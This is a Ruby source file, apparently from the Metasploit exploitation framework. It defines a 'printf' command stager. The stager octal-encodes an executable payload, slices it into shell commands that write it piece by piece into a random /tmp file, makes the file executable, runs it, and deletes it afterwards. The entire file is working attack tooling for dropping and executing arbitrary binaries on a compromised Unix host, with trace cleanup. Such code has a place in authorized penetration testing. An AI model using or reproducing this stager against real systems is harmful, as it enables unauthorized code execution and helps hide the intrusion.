# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'
require 'shellwords'

module Rex
module Exploitation

class CmdStagerPrintf < CmdStagerBase

  def initialize(exe)
    super

    @var_elf = Rex::Text.rand_text_alpha(5)
  end

  #
  # Override to ensure opts[:temp] is a correct *nix path
  #
  def generate(opts = {})
    opts[:temp] = opts[:temp] || '/tmp/'
    opts[:temp].gsub!(/\\/, '/')
    opts[:temp] = opts[:temp].shellescape
    opts[:temp] << '/' if opts[:temp][-1,1] != '/'
    super
  end

  #
  # Override to set the extra byte count
  #
  def generate_cmds(opts)
    @cmd_start = "printf '"
    @cmd_end   = "'>>#{@tempdir}#{@var_elf}"
    xtra_len = @cmd_start.length + @cmd_end.length + 1
    opts.merge!({ :extra => xtra_len })
    super
  end

  #
  # Encode into a "\12\345" octal format that printf understands
  #
  def encode_payload(opts)
    encoded = @exe.dup

    # encode only necessary characters with octal escapes
    # see Shellwords::shellescape for pattern reference
    encoded.gsub!(/[^A-Za-z0-9_\-.,:\/@]/) { |match|
      Rex::Text.to_octal(match[0])
    }

    # remove leading '0's from an octal escape only if it is not followed by
    # another digit, e. g., '\012a' -> '\12a' but not '\0123' -> '\123'
    encoded.gsub!(/\\(?:00([0-9])|0([1-9][0-9]))(?![0-9])/, '\\\\\\1\\2')

    return encoded
  end

  #
  # Override it to ensure that the octal representation of a byte isn't cut
  #
  def slice_up_payload(encoded, opts)
    tmp = encoded.dup

    parts = []
    xtra_len = opts[:extra]
    xtra_len ||= 0
    while (tmp.length > 0)
      part = tmp.slice(0, (opts[:linemax] - xtra_len))

      # remove the last octal escape if it may be imcomplete
      pos = part[-4, 4].index('\\')
      part.slice!(0, part.length - 4 + pos) if pos > 0

      parts << part
      tmp.slice!(0, part.length)
    end

    parts
  end

  #
  # Combine the parts of the encoded file with the stuff that goes
  # before and after it.
  #
  def parts_to_commands(parts, opts)
    parts.map do |p|
      @cmd_start + p + @cmd_end
    end
  end

  #
  # Since the binary has been already dropped to disk, just execute and
  # delete it
  #
  def generate_cmds_decoder(opts)
    cmds = []
    # Make it all happen
    cmds << "chmod +x #{@tempdir}#{@var_elf}"
    cmds << "#{@tempdir}#{@var_elf}"

    # Clean up after unless requested not to..
    unless opts[:nodelete]
      cmds << "rm -f #{@tempdir}#{@var_elf}"
    end

    return cmds
  end

  def cmd_concat_operator
    " ; "
  end

end
end
end
